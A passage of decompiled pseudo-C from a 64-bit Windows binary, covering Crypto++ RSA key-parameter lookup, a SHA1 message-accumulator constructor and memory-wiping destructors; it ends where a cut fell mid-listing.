_QWORD *__fastcall sub_13F1237F0(_QWORD *a1)
{
  unsigned __int64 v2; // rcx
  unsigned __int64 v3; // rdx
  __int64 v4; // rcx
  unsigned __int64 v5; // rdx
  __int64 (__fastcall **v7)(); // [rsp+28h] [rbp-50h] BYREF
  unsigned __int64 v8[3]; // [rsp+30h] [rbp-48h] BYREF
  __int64 v9; // [rsp+48h] [rbp-30h] BYREF
  __int64 v10; // [rsp+50h] [rbp-28h]
  __int64 v11; // [rsp+60h] [rbp-18h]
  int v12; // [rsp+90h] [rbp+18h] BYREF

  v12 = 1;
  v7 = off_13F181EC8;
  sub_13F1127B0(v8, 1ui64, &v12);
  sub_13F113A30(&v9, (__int64)&v7, 2);
  v2 = v8[0];
  if ( v8[0] )
  {
    v3 = 4 * ((__int64)(v8[2] - v8[0]) >> 2);
    if ( v3 >= 0x1000 )
    {
      v3 += 39i64;
      v2 = *(_QWORD *)(v8[0] - 8);
      if ( v8[0] - v2 - 8 > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v2, v3);
  }
  sub_13F113A30(a1, (__int64)&v9, 840);
  v4 = v10;
  if ( v10 )
  {
    v5 = (v11 - v10) & 0xFFFFFFFFFFFFFFFCui64;
    if ( v5 >= 0x1000 )
    {
      v5 += 39i64;
      v4 = *(_QWORD *)(v10 - 8);
      if ( (unsigned __int64)(v10 - v4 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v4, v5);
  }
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();

//----- (000000013F1238F0) ----------------------------------------------------
__int64 __fastcall sub_13F1238F0(__int64 a1, __int64 a2)
{
  __int64 v2; // r8
  __int64 v4; // r8
  __int64 v5; // rcx
  __int64 result; // rax

  v2 = *(_QWORD *)(a1 + 16);
  *(_QWORD *)(a1 + 16) = *(_QWORD *)(a2 + 16);
  *(_QWORD *)(a2 + 16) = v2;
  v4 = *(_QWORD *)(a1 + 24);
  *(_QWORD *)(a1 + 24) = *(_QWORD *)(a2 + 24);
  *(_QWORD *)(a2 + 24) = v4;
  v5 = *(_QWORD *)(a1 + 32);
  *(_QWORD *)(a1 + 32) = *(_QWORD *)(a2 + 32);
  *(_QWORD *)(a2 + 32) = v5;
  LODWORD(v5) = *(_DWORD *)(a1 + 40);
  result = *(unsigned int *)(a2 + 40);
  *(_DWORD *)(a1 + 40) = result;
  *(_DWORD *)(a2 + 40) = v5;
  return result;
}

//----- (000000013F123940) ----------------------------------------------------
__int64 __fastcall sub_13F123940(__int64 a1, const __m128i *a2, __int64 a3)
{
  unsigned __int64 v6; // rcx
  __int64 v7; // rdx
  const __m128i *v9; // rax
  __m128i *v10; // rax
  __m128i *v11; // rax
  __m128i *v12; // rax
  __m128i *v13; // rax
  char v14[16]; // [rsp+28h] [rbp-120h] BYREF
  unsigned __int64 v15; // [rsp+38h] [rbp-110h]
  unsigned __int64 v16; // [rsp+40h] [rbp-108h]
  void *v17; // [rsp+48h] [rbp-100h]
  __m128i v18[2]; // [rsp+58h] [rbp-F0h] BYREF
  __m128i v19[2]; // [rsp+78h] [rbp-D0h] BYREF
  __m128i v20[2]; // [rsp+98h] [rbp-B0h] BYREF
  __m128i v21[2]; // [rsp+B8h] [rbp-90h] BYREF
  char pExceptionObject[64]; // [rsp+E0h] [rbp-68h] BYREF

  if ( !*(_BYTE *)(a1 + 16) )
  {
    sub_13F112CF0((__int64)v14);
    if ( !(*(unsigned __int8 (__fastcall **)(_QWORD, const __m128i *, void *, char *, __int64))(**(_QWORD **)(a1 + 8)
                                                                                              + 8i64))(
            *(_QWORD *)(a1 + 8),
            a2,
            &CryptoPP::Integer `RTTI Type Descriptor',
            v14,
            -2i64) )
    {
      v9 = (const __m128i *)sub_13F1014D0((__int64)&CryptoPP::InvertibleRSAFunction `RTTI Type Descriptor');
      v10 = sub_13F1053B0(v18, v9);
      v11 = sub_13F107420(v19, v10, (const __m128i *)": Missing required parameter '");
      v12 = sub_13F107420(v20, v11, a2);
      v13 = sub_13F107420(v21, v12, (const __m128i *)&qword_13F19B5B0);
      sub_13F101600((__int64)pExceptionObject, v13);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    (*(void (__fastcall **)(__int64, char *))a3)(
      *(_QWORD *)a1 + *(int *)(*(int *)(a3 + 12) + *(_QWORD *)(*(_QWORD *)a1 + 16i64)) + *(int *)(a3 + 8) + 16i64,
      v14);
    v6 = v16;
    if ( v15 < v16 )
      v6 = v15;
    v7 = (__int64)v17;
    if ( v17 )
    {
      memset(v17, 0, 8 * v6);
      sub_13F12E4D0(v7);
    }
  }
  return a1;
}
// 13F19B5B0: using guessed type __int64 qword_13F19B5B0;
// 13F123940: using guessed type __m128i var_F0[2];
// 13F123940: using guessed type __m128i var_D0[2];
// 13F123940: using guessed type __m128i var_B0[2];
// 13F123940: using guessed type __m128i var_90[2];

//----- (000000013F123A90) ----------------------------------------------------
__int64 __fastcall sub_13F123A90(__int64 a1, const __m128i *a2, __int64 a3)
{
  unsigned __int64 v6; // rcx
  __int64 v7; // rdx
  const __m128i *v9; // rax
  __m128i *v10; // rax
  __m128i *v11; // rax
  __m128i *v12; // rax
  __m128i *v13; // rax
  char v14[16]; // [rsp+28h] [rbp-120h] BYREF
  unsigned __int64 v15; // [rsp+38h] [rbp-110h]
  unsigned __int64 v16; // [rsp+40h] [rbp-108h]
  void *v17; // [rsp+48h] [rbp-100h]
  __m128i v18[2]; // [rsp+58h] [rbp-F0h] BYREF
  __m128i v19[2]; // [rsp+78h] [rbp-D0h] BYREF
  __m128i v20[2]; // [rsp+98h] [rbp-B0h] BYREF
  __m128i v21[2]; // [rsp+B8h] [rbp-90h] BYREF
  char pExceptionObject[64]; // [rsp+E0h] [rbp-68h] BYREF

  if ( !*(_BYTE *)(a1 + 16) )
  {
    sub_13F112CF0((__int64)v14);
    if ( !(*(unsigned __int8 (__fastcall **)(_QWORD, const __m128i *, void *, char *, __int64))(**(_QWORD **)(a1 + 8)
                                                                                              + 8i64))(
            *(_QWORD *)(a1 + 8),
            a2,
            &CryptoPP::Integer `RTTI Type Descriptor',
            v14,
            -2i64) )
    {
      v9 = (const __m128i *)sub_13F1014D0((__int64)&off_13F1C3040);
      v10 = sub_13F1053B0(v18, v9);
      v11 = sub_13F107420(v19, v10, (const __m128i *)": Missing required parameter '");
      v12 = sub_13F107420(v20, v11, a2);
      v13 = sub_13F107420(v21, v12, (const __m128i *)&qword_13F19B5B0);
      sub_13F101600((__int64)pExceptionObject, v13);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
    (*(void (__fastcall **)(__int64, char *))a3)(
      *(_QWORD *)a1 + *(int *)(*(int *)(a3 + 12) + *(_QWORD *)(*(_QWORD *)a1 + 16i64)) + *(int *)(a3 + 8) + 16i64,
      v14);
    v6 = v16;
    if ( v15 < v16 )
      v6 = v15;
    v7 = (__int64)v17;
    if ( v17 )
    {
      memset(v17, 0, 8 * v6);
      sub_13F12E4D0(v7);
    }
  }
  return a1;
}
// 13F19B5B0: using guessed type __int64 qword_13F19B5B0;
// 13F1C3040: using guessed type void **off_13F1C3040;
// 13F123A90: using guessed type __m128i var_F0[2];
// 13F123A90: using guessed type __m128i var_D0[2];
// 13F123A90: using guessed type __m128i var_B0[2];
// 13F123A90: using guessed type __m128i var_90[2];

//----- (000000013F123BE0) ----------------------------------------------------
__int64 __fastcall sub_13F123BE0(__int64 a1, __int64 a2, __int64 a3)
{
  const __m128i *v6; // rax
  unsigned __int64 v7; // r8
  __m128i *v8; // rax
  __int128 *v9; // rdx
  char v10; // bp
  __int64 v11; // rdx
  __int64 v12; // rcx
  __int64 v13; // rdx
  __int64 v14; // rcx
  __m128i v16; // [rsp+28h] [rbp-60h] BYREF
  __m128i v17; // [rsp+38h] [rbp-50h]
  __m128i v18; // [rsp+48h] [rbp-40h] BYREF
  __m128i si128; // [rsp+58h] [rbp-30h]

  *(_QWORD *)a1 = a2;
  *(_QWORD *)(a1 + 8) = a3;
  *(_BYTE *)(a1 + 16) = 0;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v18.m128i_i8[0] = 0;
  sub_13F106C30(&v18, (const __m128i *)"ThisObject:");
  v6 = (const __m128i *)sub_13F15E554((__int64)&qword_13F1C21A0, (__int64)qword_13F1C5720);
  v7 = -1i64;
  do
    ++v7;
  while ( v6->m128i_i8[v7] );
  v8 = sub_13F106DB0(&v18, v6, v7);
  v17 = 0i64;
  v16 = *v8;
  v17 = v8[1];
  v8[1].m128i_i64[0] = 0i64;
  v8[1].m128i_i64[1] = 15i64;
  v8->m128i_i8[0] = 0;
  v9 = (__int128 *)&v16;
  if ( v17.m128i_i64[1] >= 0x10ui64 )
    v9 = (__int128 *)v16.m128i_i64[0];
  v10 = (*(__int64 (__fastcall **)(__int64, __int128 *, void *, __int64, __int64))(*(_QWORD *)a3 + 8i64))(
          a3,
          v9,
          &CryptoPP::InvertibleRSAFunction `RTTI Type Descriptor',
          a2,
          -2i64);
  if ( v17.m128i_i64[1] >= 0x10ui64 )
  {
    v11 = v17.m128i_i64[1] + 1;
    v12 = v16.m128i_i64[0];
    if ( (unsigned __int64)(v17.m128i_i64[1] + 1) >= 0x1000 )
    {
      v11 = v17.m128i_i64[1] + 40;
      v12 = *(_QWORD *)(v16.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v16.m128i_i64[0] - v12 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v12, v11);
  }
  v17 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v16.m128i_i8[0] = 0;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v13 = si128.m128i_i64[1] + 1;
    v14 = v18.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v13 = si128.m128i_i64[1] + 40;
      v14 = *(_QWORD *)(v18.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v18.m128i_i64[0] - v14 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v14, v13);
  }
  if ( v10 )
  {
    *(_BYTE *)(a1 + 16) = 1;
  }
  else if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C3048, (__int64)&qword_13F1C21A0) )
  {
    sub_13F124B70(a2 + 120, a3);
  }
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;
// 13F1C21A0: using guessed type __int64 qword_13F1C21A0;
// 13F1C3048: using guessed type __int64 qword_13F1C3048;
// 13F1C5720: using guessed type __int64 qword_13F1C5720[2];

//----- (000000013F123DB0) ----------------------------------------------------
__int64 __fastcall sub_13F123DB0(__int64 a1, __int64 a2, __int64 a3)
{
  const __m128i *v6; // rax
  unsigned __int64 v7; // r8
  __m128i *v8; // rax
  __int128 *v9; // rdx
  char v10; // bp
  __int64 v11; // rdx
  __int64 v12; // rcx
  __int64 v13; // rdx
  __int64 v14; // rcx
  __m128i v16; // [rsp+28h] [rbp-60h] BYREF
  __m128i v17; // [rsp+38h] [rbp-50h]
  __m128i v18; // [rsp+48h] [rbp-40h] BYREF
  __m128i si128; // [rsp+58h] [rbp-30h]

  *(_QWORD *)a1 = a2;
  *(_QWORD *)(a1 + 8) = a3;
  *(_BYTE *)(a1 + 16) = 0;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v18.m128i_i8[0] = 0;
  sub_13F106C30(&v18, (const __m128i *)"ThisObject:");
  v6 = (const __m128i *)sub_13F15E554((__int64)&qword_13F1C3048, (__int64)qword_13F1C5720);
  v7 = -1i64;
  do
    ++v7;
  while ( v6->m128i_i8[v7] );
  v8 = sub_13F106DB0(&v18, v6, v7);
  v17 = 0i64;
  v16 = *v8;
  v17 = v8[1];
  v8[1].m128i_i64[0] = 0i64;
  v8[1].m128i_i64[1] = 15i64;
  v8->m128i_i8[0] = 0;
  v9 = (__int128 *)&v16;
  if ( v17.m128i_i64[1] >= 0x10ui64 )
    v9 = (__int128 *)v16.m128i_i64[0];
  v10 = (*(__int64 (__fastcall **)(__int64, __int128 *, void ***, __int64, __int64))(*(_QWORD *)a3 + 8i64))(
          a3,
          v9,
          &off_13F1C3040,
          a2,
          -2i64);
  if ( v17.m128i_i64[1] >= 0x10ui64 )
  {
    v11 = v17.m128i_i64[1] + 1;
    v12 = v16.m128i_i64[0];
    if ( (unsigned __int64)(v17.m128i_i64[1] + 1) >= 0x1000 )
    {
      v11 = v17.m128i_i64[1] + 40;
      v12 = *(_QWORD *)(v16.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v16.m128i_i64[0] - v12 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v12, v11);
  }
  v17 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v16.m128i_i8[0] = 0;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v13 = si128.m128i_i64[1] + 1;
    v14 = v18.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v13 = si128.m128i_i64[1] + 40;
      v14 = *(_QWORD *)(v18.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v18.m128i_i64[0] - v14 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v14, v13);
  }
  if ( v10 )
  {
    *(_BYTE *)(a1 + 16) = 1;
  }
  else if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C3048, (__int64)&qword_13F1C3048) )
  {
    sub_13F124B70(a2 + 120, a3);
  }
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;
// 13F1C3040: using guessed type void **off_13F1C3040;
// 13F1C3048: using guessed type __int64 qword_13F1C3048;
// 13F1C5720: using guessed type __int64 qword_13F1C5720[2];

//----- (000000013F123F80) ----------------------------------------------------
__int64 __fastcall sub_13F123F80(__int64 a1, __int64 a2, __m128i *a3, __int64 a4, _QWORD *a5, __int64 a6)
{
  signed __int64 v10; // rax
  __m128i *v11; // rsi
  const __m128i *v12; // rbp
  unsigned __int64 v13; // r8
  __int64 v14; // rdx
  __int64 v15; // rax
  __int64 v16; // rbx
  unsigned __int64 v17; // r8
  __m128i *v18; // rax
  unsigned __int64 v19; // rdx
  unsigned __int64 v20; // r8
  signed __int64 v21; // rax
  const __m128i *v22; // rcx
  unsigned __int8 *v23; // rdx
  signed __int64 v24; // rax
  int v25; // er8
  int v26; // er9
  __int64 result; // rax
  char v28; // al

  *(_QWORD *)a1 = a2;
  *(_QWORD *)(a1 + 16) = a4;
  *(_QWORD *)(a1 + 24) = a5;
  *(_WORD *)(a1 + 32) = 0;
  *(_QWORD *)(a1 + 8) = a3;
  if ( !(unsigned int)sub_13F16A230((unsigned __int8 *)a3, (__int64)"ValueNames") )
  {
    *(_WORD *)(a1 + 32) = 257;
    sub_13F101D10(a3, (__int64)&std::string `RTTI Type Descriptor', a4);
    if ( a6 )
      (*(void (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(
        a6,
        *(_QWORD *)(a1 + 8),
        a4,
        a5);
    if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C21A0, (__int64)&qword_13F1C3048) )
      sub_13F126EB0(a2 + 120, *(__m128i **)(a1 + 8), a4, a5);
    v10 = sub_13F15E554((__int64)&qword_13F1C21A0, (__int64)qword_13F1C5720);
    v11 = *(__m128i **)(a1 + 24);
    v12 = (const __m128i *)v10;
    v13 = v11[1].m128i_u64[1];
    v14 = v11[1].m128i_i64[0];
    if ( v13 - v14 < 0xC )
    {
      v11 = sub_13F107AD0(v11, 0xCui64, 0i64, (const __m128i *)"ThisPointer:", 0xCui64);
    }
    else
    {
      v15 = *(_QWORD *)(a1 + 24);
      v11[1].m128i_i64[0] = v14 + 12;
      if ( v13 >= 0x10 )
        v15 = v11->m128i_i64[0];
      v16 = v15 + v14;
      sub_13F15EB00((__m128i *)(v15 + v14), (const __m128i *)"ThisPointer:", 0xCui64);
      *(_BYTE *)(v16 + 12) = 0;
    }
    v17 = -1i64;
    do
      ++v17;
    while ( v12->m128i_i8[v17] );
    v18 = sub_13F106DB0(v11, v12, v17);
    v19 = v18[1].m128i_u64[0];
    v20 = v18[1].m128i_u64[1];
    if ( v19 >= v20 )
    {
      sub_13F10ECD0(v18, 1ui64, 0i64, 59);
    }
    else
    {
      v18[1].m128i_i64[0] = v19 + 1;
      if ( v20 >= 0x10 )
        v18 = (__m128i *)v18->m128i_i64[0];
      *(__int16 *)((char *)v18->m128i_i16 + v19) = 59;
    }
  }
  if ( *(_BYTE *)(a1 + 32) || (unsigned int)sub_13F16A1A0(*(_QWORD **)(a1 + 8), (__int64)"ThisPointer:", 0xCui64) )
    goto LABEL_33;
  v21 = sub_13F15E554((__int64)&qword_13F1C21A0, (__int64)qword_13F1C5720);
  v22 = *(const __m128i **)(a1 + 8);
  v23 = &v22->m128i_u8[12];
  v24 = v21 - ((_QWORD)&v22->m128i_i64[1] + 4);
  do
  {
    v25 = v23[v24];
    v26 = *v23 - v25;
    if ( v26 )
      break;
    ++v23;
  }
  while ( v25 );
  if ( v26 )
  {
LABEL_33:
    if ( !*(_BYTE *)(a1 + 32) )
    {
      if ( !a6
        || (v28 = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(
                    a6,
                    *(_QWORD *)(a1 + 8),
                    a4,
                    a5),
            (*(_BYTE *)(a1 + 32) = v28) == 0) )
      {
        if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C21A0, (__int64)&qword_13F1C3048) )
          *(_BYTE *)(a1 + 32) = sub_13F126EB0(a2 + 120, *(__m128i **)(a1 + 8), a4, a5);
      }
    }
    return a1;
  }
  else
  {
    sub_13F101D10(v22, (__int64)&CryptoPP::InvertibleRSAFunction * `RTTI Type Descriptor', *(_QWORD *)(a1 + 16));
    *a5 = a2;
    result = a1;
    *(_BYTE *)(a1 + 32) = 1;
  }
  return result;
}
// 13F1BF6A0: using guessed type void **std::string `RTTI Type Descriptor';
// 13F1BF790: using guessed type struct CryptoPP::InvertibleRSAFunction *CryptoPP::InvertibleRSAFunction * `RTTI Type Descriptor';
// 13F1C21A0: using guessed type __int64 qword_13F1C21A0;
// 13F1C3048: using guessed type __int64 qword_13F1C3048;
// 13F1C5720: using guessed type __int64 qword_13F1C5720[2];

//----- (000000013F124220) ----------------------------------------------------
__int64 __fastcall sub_13F124220(__int64 a1, __int64 a2, __m128i *a3, __int64 a4, _QWORD *a5, __int64 a6)
{
  signed __int64 v10; // rax
  __m128i *v11; // rsi
  const __m128i *v12; // rbp
  unsigned __int64 v13; // r8
  __int64 v14; // rdx
  __int64 v15; // rax
  __int64 v16; // rbx
  unsigned __int64 v17; // r8
  __m128i *v18; // rax
  unsigned __int64 v19; // rdx
  unsigned __int64 v20; // r8
  signed __int64 v21; // rax
  const __m128i *v22; // rcx
  unsigned __int8 *v23; // rdx
  signed __int64 v24; // rax
  int v25; // er8
  int v26; // er9
  __int64 result; // rax
  char v28; // al

  *(_QWORD *)a1 = a2;
  *(_QWORD *)(a1 + 16) = a4;
  *(_QWORD *)(a1 + 24) = a5;
  *(_WORD *)(a1 + 32) = 0;
  *(_QWORD *)(a1 + 8) = a3;
  if ( !(unsigned int)sub_13F16A230((unsigned __int8 *)a3, (__int64)"ValueNames") )
  {
    *(_WORD *)(a1 + 32) = 257;
    sub_13F101D10(a3, (__int64)&std::string `RTTI Type Descriptor', a4);
    if ( a6 )
      (*(void (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(
        a6,
        *(_QWORD *)(a1 + 8),
        a4,
        a5);
    if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C3048, (__int64)&qword_13F1C3048) )
      sub_13F126EB0(a2 + 120, *(__m128i **)(a1 + 8), a4, a5);
    v10 = sub_13F15E554((__int64)&qword_13F1C3048, (__int64)qword_13F1C5720);
    v11 = *(__m128i **)(a1 + 24);
    v12 = (const __m128i *)v10;
    v13 = v11[1].m128i_u64[1];
    v14 = v11[1].m128i_i64[0];
    if ( v13 - v14 < 0xC )
    {
      v11 = sub_13F107AD0(v11, 0xCui64, 0i64, (const __m128i *)"ThisPointer:", 0xCui64);
    }
    else
    {
      v15 = *(_QWORD *)(a1 + 24);
      v11[1].m128i_i64[0] = v14 + 12;
      if ( v13 >= 0x10 )
        v15 = v11->m128i_i64[0];
      v16 = v15 + v14;
      sub_13F15EB00((__m128i *)(v15 + v14), (const __m128i *)"ThisPointer:", 0xCui64);
      *(_BYTE *)(v16 + 12) = 0;
    }
    v17 = -1i64;
    do
      ++v17;
    while ( v12->m128i_i8[v17] );
    v18 = sub_13F106DB0(v11, v12, v17);
    v19 = v18[1].m128i_u64[0];
    v20 = v18[1].m128i_u64[1];
    if ( v19 >= v20 )
    {
      sub_13F10ECD0(v18, 1ui64, 0i64, 59);
    }
    else
    {
      v18[1].m128i_i64[0] = v19 + 1;
      if ( v20 >= 0x10 )
        v18 = (__m128i *)v18->m128i_i64[0];
      *(__int16 *)((char *)v18->m128i_i16 + v19) = 59;
    }
  }
  if ( *(_BYTE *)(a1 + 32) || (unsigned int)sub_13F16A1A0(*(_QWORD **)(a1 + 8), (__int64)"ThisPointer:", 0xCui64) )
    goto LABEL_33;
  v21 = sub_13F15E554((__int64)&qword_13F1C3048, (__int64)qword_13F1C5720);
  v22 = *(const __m128i **)(a1 + 8);
  v23 = &v22->m128i_u8[12];
  v24 = v21 - ((_QWORD)&v22->m128i_i64[1] + 4);
  do
  {
    v25 = v23[v24];
    v26 = *v23 - v25;
    if ( v26 )
      break;
    ++v23;
  }
  while ( v25 );
  if ( v26 )
  {
LABEL_33:
    if ( !*(_BYTE *)(a1 + 32) )
    {
      if ( !a6
        || (v28 = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a6 + 8i64))(
                    a6,
                    *(_QWORD *)(a1 + 8),
                    a4,
                    a5),
            (*(_BYTE *)(a1 + 32) = v28) == 0) )
      {
        if ( (unsigned int)sub_13F15E52C((__int64)&qword_13F1C3048, (__int64)&qword_13F1C3048) )
          *(_BYTE *)(a1 + 32) = sub_13F126EB0(a2 + 120, *(__m128i **)(a1 + 8), a4, a5);
      }
    }
    return a1;
  }
  else
  {
    sub_13F101D10(v22, (__int64)&CryptoPP::RSAFunction * `RTTI Type Descriptor', *(_QWORD *)(a1 + 16));
    *a5 = a2;
    result = a1;
    *(_BYTE *)(a1 + 32) = 1;
  }
  return result;
}
// 13F1BF6A0: using guessed type void **std::string `RTTI Type Descriptor';
// 13F1BF7C8: using guessed type struct CryptoPP::RSAFunction *CryptoPP::RSAFunction * `RTTI Type Descriptor';
// 13F1C3048: using guessed type __int64 qword_13F1C3048;
// 13F1C5720: using guessed type __int64 qword_13F1C5720[2];

//----- (000000013F1244C0) ----------------------------------------------------
__int64 __fastcall sub_13F1244C0(__int64 a1)
{
  sub_13F10EE30(a1, 1);
  *(_QWORD *)(a1 + 16) = -1i64;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_QWORD *)(a1 + 48) = -1i64;
  *(_QWORD *)(a1 + 56) = 0i64;
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_QWORD *)(a1 + 80) = -1i64;
  *(_QWORD *)(a1 + 88) = 0i64;
  *(_QWORD *)(a1 + 96) = 0i64;
  *(_QWORD *)(a1 + 112) = -1i64;
  *(_QWORD *)(a1 + 120) = 0i64;
  *(_QWORD *)(a1 + 128) = 0i64;
  sub_13F112CF0(a1 + 136);
  sub_13F112CF0(a1 + 184);
  *(_BYTE *)(a1 + 232) = 1;
  sub_13F1057D0(a1 + 240);
  *(_QWORD *)a1 = &CryptoPP::PK_MessageAccumulatorImpl<CryptoPP::SHA1>::`vftable';
  return a1;
}
// 13F186B50: using guessed type void *CryptoPP::PK_MessageAccumulatorImpl<CryptoPP::SHA1>::`vftable';

//----- (000000013F124570) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F124570(_QWORD *a1)
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  void *v4; // rdx
  __int64 v5; // rcx
  void *v6; // rdx
  __int64 v7; // rcx
  void *v8; // rdx
  __int64 v9; // rcx
  void *v10; // rdx
  __int64 v11; // rcx
  void *v12; // rdx
  __int64 v13; // rcx
  unsigned __int64 result; // rax
  void *v15; // rdx

  v2 = 26i64;
  if ( a1[25] < a1[26] )
    v2 = 25i64;
  v3 = a1[v2];
  v4 = (void *)a1[27];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    sub_13F12E4D0((__int64)v4);
  }
  v5 = 20i64;
  if ( a1[19] < a1[20] )
    v5 = 19i64;
  v6 = (void *)a1[21];
  if ( v6 )
  {
    memset(v6, 0, 8i64 * a1[v5]);
    sub_13F12E4D0((__int64)v6);
  }
  v7 = 15i64;
  if ( a1[14] < a1[15] )
    v7 = 14i64;
  v8 = (void *)a1[16];
  if ( v8 )
  {
    memset(v8, 0, a1[v7]);
    sub_13F12E550(v8);
  }
  v9 = 11i64;
  if ( a1[10] < a1[11] )
    v9 = 10i64;
  v10 = (void *)a1[12];
  if ( v10 )
  {
    memset(v10, 0, a1[v9]);
    sub_13F12E550(v10);
  }
  v11 = 7i64;
  if ( a1[6] < a1[7] )
    v11 = 6i64;
  v12 = (void *)a1[8];
  if ( v12 )
  {
    memset(v12, 0, a1[v11]);
    sub_13F12E550(v12);
  }
  v13 = 3i64;
  result = a1[3];
  if ( a1[2] < result )
    v13 = 2i64;
  v15 = (void *)a1[4];
  if ( v15 )
  {
    memset(v15, 0, a1[v13]);
    return sub_13F12E550(v15);
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F1246F0) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F1246F0(_QWORD *a1))()
{
  __int64 v2; // rdx
  __int64 v3; // rcx
  void *v4; // rdx
  __int64 (__fastcall **result)(); // rax

  v2 = 4i64;
  if ( a1[3] < a1[4] )
    v2 = 3i64;
  v3 = a1[v2];
  v4 = (void *)a1[5];
  if ( v4 )
  {
    memset(v4, 0, 8 * v3);
    sub_13F12E4D0((__int64)v4);
  }
  result = off_13F186690;
  *a1 = off_13F186690;
  return result;
}
// 13F186690: using guessed type __int64 (__fastcall *off_13F186690[3])();

//----- (000000013F124750) ----------------------------------------------------
__int64 __fastcall sub_13F124750(__int64 a1, char a2)
{
  __int64 v2; // r8
  unsigned __int64 v4; // rcx
  _DWORD *v6; // rdi
  unsigned __int64 v7; // rcx
  _DWORD *v8; // rdi

  v2 = a1 + 352;
  v4 = *(_QWORD *)(a1 + 432);
  v6 = *(_DWORD **)(v2 + 88);
  if ( *(_QWORD *)(v2 + 72) < v4 )
    v4 = *(_QWORD *)(v2 + 72);
  *(_BYTE *)(v2 + 65) = 0;
  if ( v6 == (_DWORD *)v2 )
  {
    while ( v4 )
    {
      *v6++ = 0;
      --v4;
    }
  }
  v7 = *(_QWORD *)(a1 + 336);
  v8 = *(_DWORD **)(a1 + 344);
  if ( *(_QWORD *)(a1 + 328) < v7 )
    v7 = *(_QWORD *)(a1 + 328);
  *(_BYTE *)(a1 + 321) = 0;
  if ( v8 == (_DWORD *)(a1 + 256) )
  {
    while ( v7 )
    {
      *v8++ = 0;
      --v7;
    }
  }
  sub_13F124570((_QWORD *)a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 448i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1247E0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1247E0(_QWORD *a1, char a2)
{
  *a1 = off_13F186690;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 8i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F186690: using guessed type __int64 (__fastcall *off_13F186690[3])();

//----- (000000013F124810) ----------------------------------------------------
_QWORD *__fastcall sub_13F124810(_QWORD *a1, char a2)
{
  __int64 v4; // rdi
  void *v5; // r8

  v4 = 4i64;
  if ( a1[3] < a1[4] )
    v4 = 3i64;
  v5 = (void *)a1[5];
  if ( v5 )
  {
    memset(v5, 0, 8i64 * a1[v4]);
    sub_13F12E4D0((__int64)v5);
  }
  *a1 = off_13F186690;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 56i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F186690: using guessed type __int64 (__fastcall *off_13F186690[3])();

//----- (000000013F1248A0) ----------------------------------------------------
__int64 __fastcall sub_13F1248A0(__int64 a1)
{
  return a1 + 240;
}

//----- (000000013F1248B0) ----------------------------------------------------
__int64 __fastcall sub_13F1248B0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 144i64))(a1 - 8) + 136;
}

//----- (000000013F1248D0) ----------------------------------------------------
__int64 __fastcall sub_13F1248D0(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 160i64))(a1 - 8) + 16;
}

//----- (000000013F1248F0) ----------------------------------------------------
